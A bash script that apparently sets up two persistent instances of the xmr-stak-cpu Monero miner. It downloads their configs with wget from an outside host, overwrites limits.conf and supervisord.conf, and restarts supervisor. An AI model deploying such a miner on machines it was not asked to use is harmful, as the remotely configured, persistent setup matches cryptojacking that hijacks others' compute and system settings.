#!/bin/bash
apt -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git vim supervisor cpulimit

rm /root/1 -r
mkdir /root/1
cp ./xmr-stak-cpu /root/1/xmr-stak-cpu
wget -O /root/1/config.txt http://krasdar.net/xn/c.php


rm /root/2 -r
mkdir /root/2
cp ./xmr-stak-cpu /root/2/xmr-stak-cpu
wget -O /root/2/config.txt http://krasdar.net/xn/c2.php


sysctl -w vm.nr_hugepages=128
ulimit -l
cp -rf ./limits.conf /etc/security/limits.conf

cp -rf ./supervisord.conf /etc/supervisor/supervisord.conf
/etc/init.d/supervisor restart all

#cp -rf ./rc.local /etc/rc.local
#/etc/rc.local
